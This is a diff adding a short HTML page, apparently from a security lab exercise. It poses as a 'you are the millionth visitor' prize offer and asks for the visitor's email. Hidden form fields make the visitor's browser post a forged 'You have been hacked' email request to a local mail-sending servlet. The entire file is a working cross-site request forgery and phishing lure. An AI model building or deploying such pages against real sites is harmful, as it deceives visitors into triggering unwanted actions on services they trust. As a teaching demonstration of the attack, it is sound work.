@@ -1,0 +1,22 @@
+scam <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WOW</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div style="text-align: center;">
+      <h1>🚀Congratulations!🚀</h1>
+      <h3>You are the 1.000.000th user visiting this website!!</h3>
+      <p>Enter your email to receive a special discount on our products: 🎁</p>
+      <form action="http://localhost:8080/security/SendMailServlet" method="post">
+          <input type="email" name="email" placeholder="Your Email">
+          <input type="hidden" name="receiver" value="john@smith.com">
+          <input type="hidden" name="subject" value="You have been hacked">
+          <input type="hidden" name="body" value="hacked">
+          <input type="submit"></input>
+      </form>
+  </div>
+</body>
+</html>
